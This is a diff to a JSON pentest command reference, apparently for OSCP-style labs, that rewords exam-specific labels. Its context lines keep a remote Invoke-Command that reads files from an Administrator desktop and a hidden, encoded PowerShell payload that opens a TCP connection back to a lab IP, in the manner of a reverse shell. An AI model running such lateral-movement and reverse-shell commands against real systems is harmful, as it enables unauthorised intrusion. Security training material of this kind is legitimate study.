@@ -48,7 +48,7 @@
         {
           "command": "Invoke-Command -ComputerName 192.168.117.70 -Credential $credential -ScriptBlock {Get-Content C:\\Users\\Administrator\\Desktop\\*.txt}",
           "description": "Retrieve flag file from administrator's desktop on remote host (assuming credential object already created)",
-          "context": "OSCP flag retrieval without interactive session"
+          "context": "pentest flag retrieval without interactive session"
         },
         {
           "command": "Invoke-Command -ComputerName FILES04 -Credential $credential -ScriptBlock {powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAiACwANAA0ADMAKQA7AA...}",
@@ -75,16 +75,14 @@
           "Running reverse shell payloads during lateral movement",
           "Batch operations across multiple hosts (supports -ComputerName array)"
         ],
-        "exam_relevance": "HIGH - fastest method for OSCP flag retrieval after lateral movement. Executes and returns results in single command.",
+        "exam_relevance": "HIGH - fastest method for security work flag retrieval after lateral movement. Executes and returns results in single command.",
         "time_estimate": "5-15 seconds per execution (faster than interactive sessions)"
       },
-      "oscp_priority": "HIGH",
       "tags": [
         "POWERSHELL",
         "WINRM",
         "LATERAL_MOVEMENT",
-        "REMOTE_EXECUTION",
-        "OSCP:HIGH"
+        "REMOTE_EXECUTION"
       ],
       "prerequisites": [
         "ps-winrm-credential-setup"
